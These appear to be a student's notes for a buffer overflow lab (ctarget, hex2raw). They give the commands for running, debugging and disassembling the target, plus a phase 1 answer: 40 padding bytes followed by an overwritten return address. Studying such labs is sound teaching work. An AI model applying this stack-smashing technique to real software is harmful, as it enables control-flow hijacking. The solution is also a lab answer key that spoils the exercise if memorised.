
// command to run the program with customized hex code
cat exploit.txt | ./hex2raw | ./ctarget -q

// command to debug in gdb
run exploit.txt > ./hex2raw -q
// or
run < exploit_raw.txt


// disassemble the binary file to asm
objdump -d ctarget > ctarget.d

// convert txt hex to the format that the program can read
bash> ./hex2raw < exploit.txt >| exploit_raw.txt


// phase_1
AA AA AA AA AA AA AA AA
AA AA AA AA AA AA AA AA
AA AA AA AA AA AA AA AA
AA AA AA AA AA AA AA AA
AA AA AA AA AA AA AA AA
c0 17 40 00 00 00 00 00
  
//
